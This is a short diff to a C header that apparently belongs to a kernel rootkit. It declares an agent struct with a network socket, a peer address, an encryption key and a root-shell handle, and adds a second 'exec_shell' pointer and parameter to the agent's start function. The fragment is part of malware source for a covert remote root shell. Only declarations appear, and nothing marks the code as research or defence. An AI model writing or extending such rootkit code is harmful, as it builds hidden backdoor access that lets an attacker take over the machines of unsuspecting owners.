@@ -23,6 +23,7 @@ struct rk_agent {
 	struct socket *active;
 	struct sockaddr_in peer;
 	struct rk_root_shell *shell;
+	struct rk_root_shell *exec_shell;
 	u8 key[RK_AEAD_KEY_LENGTH];
 	bool initialized;
 	bool stopping;
@@ -43,7 +44,8 @@ __must_check int rk_agent_start(struct rk_agent *agent,
 				unsigned int retry_base_ms,
 				unsigned int retry_max_ms,
 				const u8 *key, size_t key_length,
-				struct rk_root_shell *shell);
+				struct rk_root_shell *shell,
+				struct rk_root_shell *exec_shell);
 void rk_agent_stop(struct rk_agent *agent);
 
 #endif
